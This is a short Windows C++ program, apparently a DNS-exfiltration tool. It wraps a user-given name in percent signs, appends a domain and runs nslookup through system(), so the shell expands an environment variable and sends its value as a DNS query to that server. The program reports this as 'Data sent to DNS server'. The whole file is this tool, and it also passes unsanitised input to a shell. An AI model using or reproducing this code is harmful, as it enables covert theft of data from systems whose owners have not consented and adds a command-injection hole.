#include <iostream>
#include <string>
#include <windows.h>
#include <algorithm>
void sendToDNS(const std::string& fullAddress) {
    std::string command = "nslookup " + fullAddress;
    std::cout << "Executing command: " << command << std::endl;
    std::system(command.c_str());
}
int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <command>.<DNS server>" << std::endl;
        return 1;
    }
    std::string arg = argv[1];
    std::size_t dotPos = arg.find('.');
    if (dotPos == std::string::npos) {
        std::cerr << "Invalid format. Use: <command>.<DNS server>" << std::endl;
        return 1;
    }
    std::string command = arg.substr(0, dotPos);
    std::string server = arg.substr(dotPos + 1);
    std::string fullAddress = "%" + command + "%." + server;
    sendToDNS(fullAddress);
    std::cout << "Data sent to DNS server: " << server << std::endl;
    return 0;
}
